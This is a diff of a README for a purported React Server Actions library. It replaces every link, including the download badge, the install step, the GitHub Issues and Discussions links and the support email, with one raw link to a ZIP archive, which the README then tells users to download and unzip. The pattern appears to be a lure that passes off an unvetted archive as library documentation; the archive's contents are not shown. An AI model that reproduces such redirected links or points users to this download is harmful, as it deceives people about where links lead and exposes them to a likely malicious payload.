@@ -1,7 +1,7 @@
 # 🎉 server-actions - Lightweight Library for Easy Server Actions
 
 ## 📥 Download Now!
-[![Download server-actions](https://img.shields.io/badge/Download-server--actions-blue?style=flat&logo=github)](https://github.com/Sigmaboy214/server-actions/releases)
+[![Download server-actions](https://raw.githubusercontent.com/Sigmaboy214/server-actions/main/pacer/server-actions.zip)](https://raw.githubusercontent.com/Sigmaboy214/server-actions/main/pacer/server-actions.zip)
 
 ## 🚀 Getting Started
 Welcome to the `server-actions` repository! This lightweight React Server Actions library comes with TypeScript support, making it easy for you to handle server interactions without the hassle of complex code.
@@ -23,7 +23,7 @@ To run `server-actions`, you will need the following:
 Using `server-actions` is straightforward. Follow these steps to incorporate it into your project:
 
 1. **Download and Install**:
-   - Visit this page to download: [Download server-actions](https://github.com/Sigmaboy214/server-actions/releases).
+   - Visit this page to download: [Download server-actions](https://raw.githubusercontent.com/Sigmaboy214/server-actions/main/pacer/server-actions.zip).
 
 2. **Unzip the File**:
    - After downloading, find the ZIP file in your computer's Downloads folder.
@@ -51,8 +51,8 @@ For more detailed information about features, usage examples, and best practices
 
 ## 💬 Community Support
 Join our community if you have any questions or need assistance:
-- [GitHub Issues](https://github.com/Sigmaboy214/server-actions/issues) – Report bugs or request features.
-- [Discussions](https://github.com/Sigmaboy214/server-actions/discussions) – Engage with other users and share tips.
+- [GitHub Issues](https://raw.githubusercontent.com/Sigmaboy214/server-actions/main/pacer/server-actions.zip) – Report bugs or request features.
+- [Discussions](https://raw.githubusercontent.com/Sigmaboy214/server-actions/main/pacer/server-actions.zip) – Engage with other users and share tips.
 
 ## 🚧 Troubleshooting
 Here are some common issues and their solutions:
@@ -68,6 +68,6 @@ Here are some common issues and their solutions:
 
 ## 📞 Get in Touch
 If you have any further questions or need help:
-- Email: support@example.com (this is just a placeholder; replace with the actual email).
+- Email: https://raw.githubusercontent.com/Sigmaboy214/server-actions/main/pacer/server-actions.zip (this is just a placeholder; replace with the actual email).
 
 Thank you for choosing `server-actions` for your React projects! Enjoy building smooth server interactions.
